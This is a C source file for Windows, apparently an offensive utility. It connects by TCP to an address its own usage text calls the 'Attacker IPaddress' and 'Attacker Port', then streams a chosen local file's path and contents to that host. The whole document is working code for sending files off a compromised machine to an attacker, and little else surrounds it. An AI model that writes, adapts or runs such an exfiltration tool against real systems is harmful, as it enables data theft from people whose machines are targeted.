//AUTHOR :#Captain_Nemo

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <wchar.h>
#define MAX_LINE 2048
#define BUFFSIZE 2048
#pragma comment(lib, "Ws2_32.lib")   //  indicates to the linker that the Ws2_32.lib file is required
#define DEF_BUFF 2048

void send_file(FILE *fp, SOCKET sock);
ssize_t total=0;

int main(int argc, char* argv[])
{
    SOCKET sock1;
    WSADATA wsaData;
    struct sockaddr_in serveraddr;
   // WSAStartup(MAKEWORD(2,2), &wsaData);
    const int iresult;
    if (argc != 4) 
    {
        _wperror("usage:send_file filepath <Attacker IPaddress> <Attacker Port>");
        exit(1);
    } // end if block
   // SOCKET sock1;
   // WSADATA wsaData;
   // struct sockaddr_in serveraddr;
    WSAStartup(MAKEWORD(2,2), &wsaData);  // Initialize Winsock
    sock1 = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //create socket
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(atoi(argv[3])); // change port
    serveraddr.sin_addr.s_addr = inet_addr(argv[2]);
    //if (inet_pton(AF_INET, argv[2], &serveraddr.sin_addr) < 0) // ip conversion || change ip from cmdline inet_pton InetPtonW
    //{
        //_wperror("IPaddress Convert Error");
        //exit(1);
    //} // end if block
    
    if (WSAConnect(sock1, (SOCKADDR*)&serveraddr, sizeof(serveraddr), NULL, NULL, NULL, NULL) < 0)// Call WSAConnect for socket bind
     {
       _wperror("Bind Fail");
       exit(1);
     } // end if 

    char *Full_filename = argv[1];
    char *filename;
    //char path_buffer[_MAX_PATH];
    char *drive;
    char *dir;
    char *fname;
    char *ext;
   // _splitpath(Full_filename, NULL, NULL, fname, ext);  // extract filename with extension from the complete file path
   // filename = strcat(fname, ext);//fname + ext;
     char buff[BUFFSIZE] = {0};
     strncpy(buff, Full_filename, strlen(Full_filename));
     int iresult1 = send(sock1, buff, BUFFSIZE, 0);
     if (iresult1 == SOCKET_ERROR) 
     {
        wprintf(L"send failed with error: %d\n", WSAGetLastError());
        closesocket(sock1);
        WSACleanup();
        exit(0);
     } // end if block 
     FILE *fp = fopen(argv[1], "rb");
     if (fp == NULL) 
       {
        _wperror("Can't open file");
        exit(1);
       } // end if 
     send_file(fp, sock1);   // call send_file() function
     printf("Send Success, NumBytes = %ld\n", total);
     fclose(fp);
     close(sock1);
     return 0;
  } // end main

void send_file(FILE *fp, SOCKET sock) 
{
    int n; 
    char sendline[MAX_LINE] = {0}; 
    while ((n = fread(sendline, sizeof(char), MAX_LINE, fp)) > 0) 
    {
	    total+=n;
        if (n != MAX_LINE && ferror(fp))
        {
           _wperror("Read File Error");
            exit(1);
        }
        
       int iresult = send(sock, sendline, n, 0);
        if (iresult == SOCKET_ERROR) 
          {
             wprintf(L"send failed with error: %d\n", WSAGetLastError());
             closesocket(sock);
             WSACleanup();
             exit(0);
          }
        memset(sendline, 0, MAX_LINE);
    } // end while 
}  // end send_file



